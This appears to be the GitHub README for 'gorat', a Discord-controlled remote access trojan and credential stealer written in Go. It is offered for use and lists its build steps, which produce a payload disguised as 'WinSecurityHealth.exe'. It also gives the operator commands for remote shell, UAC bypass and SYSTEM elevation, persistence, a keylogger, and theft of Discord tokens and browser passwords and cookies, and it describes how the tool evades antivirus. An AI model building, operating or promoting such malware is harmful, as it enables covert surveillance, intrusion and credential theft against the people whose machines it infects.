# gorat

![GitHub stars](https://img.shields.io/github/stars/nw8g/GoRat?style=social)
![Downloads](https://img.shields.io/github/downloads/nw8g/GoRat/total?style=social)

lightweight discord rat & stealer written in go

**status:** beta - still coding new features but everything here is stable

---

## what it does

- **remote shell** - full cmd & powershell access from discord
- **privilege escalation** - uac bypass methods + system elevation (nt authority\system)
- **stealth module** - peb unlinking, api hooking, name spoofing to dodge detection
- **discord c2** - manage your bots straight from a discord server
- **persistence** - survives reboots through multiple methods
- **data exfil** - grabs discord tokens & browser data (passwords, cookies, bookmarks, etc)
- **live surveillance** - screenshot command for realtime desktop viewing
- **keylogger** - captures keystrokes with chacha20 encryption
- **self destruct** - nukes itself from the system on command
- **tiny payload** - under 3mb compiled

check out the [changelog](./CHANGELOG.md) for latest updates

---

## is it ud?

lets be real - this is a poc not some nation-state shit, built without heavy obfuscation so any decent reverse engineer can crack it open in ida

**right now? "semi-ud"** - slips past most basic avs but dont expect miracles

defender & similar av's will probably catch it eventually

---

## building

dead simple process:

1. install go if you dont have it
2. run `build.bat` 
3. paste your **bot token** and **server id** when prompted
4. done - your payload is `WinSecurityHealth.exe` (you can rename this btw)

---

## commands

run these in your discord bot channel

### system & control
- `!help` - shows command list
- `!privs` / `!whoami` - checks current privileges (admin, system, etc)
- `!cmd <command>` - executes cmd command
- `!shell <command>` / `!ps <command>` - runs powershell command
- `!screen` - captures screenshot
- `!exit` / `!kill` - **panic button** - self destructs and removes traces

### data exfiltration
- `!tokengrab` / `!tokens` - steals all discord tokens
- `!browser` / `!browserdata` - dumps browser passwords, cookies, history, bookmarks

### privilege escalation
- `!admin [method]` / `!elevate` / `!uac` - attempts uac bypass
  - methods: `fodhelper`, `eventvwr`, `sdclt`, `computerdefaults`
  - leave blank to try all methods automatically
- `!system [method]` / `!nt` / `!authority` - elevates to system (requires admin first)
  - methods: `pipe`, `token`, `task`

### stealth & persistence
- `!hide [method]` / `!rootkit` - activates stealth features
  - methods: `peb`, `hook`, `spoof`, `all`
- `!stealth` - checks active stealth methods
- `!persist` / `!persistence` - enables persistence mechanisms
- `!unpersist` - removes persistence

### monitoring
- `!keylogger <action>` / `!keylogger <action>` - controls keylogger
  - actions: `start`, `stop`, `status`
- `!keys` / `!keylogs` - dumps captured keystrokes

---

## features breakdown

### privilege escalation
multiple uac bypass methods:
- fodhelper registry hijack
- eventvwr mmc bypass
- sdclt registry manipulation
- computerdefaults hijack

system elevation techniques:
- named pipe impersonation
- token duplication 
- scheduled task exploitation

### stealth capabilities
- **peb unlinking** - hides from process enumeration
- **api hooking** - not implemented yet, but i will soon
- **name spoofing** - masquerades as legitimate processes

### persistence methods
- registry run keys (current user & local machine)
- startup folder deployment
- scheduled tasks (multiple triggers)
- wmi event subscription

### data theft
supports chromium browsers:
- chrome (including abe poc)
- edge, brave, opera, vivaldi
- beta/dev/canary versions

extracts:
- passwords (from chromium and gecko browsers)
- cookies
- autofill data
- bookmarks
- browsing history

discord token grabber:
- scans all discord installations (stable, ptb, canary)
- finds tokens in leveldb & local storage

### keylogger
- low-level keyboard hook
- chacha20 encryption for stored logs
- logs stored in chrome cache dir for stealth

---


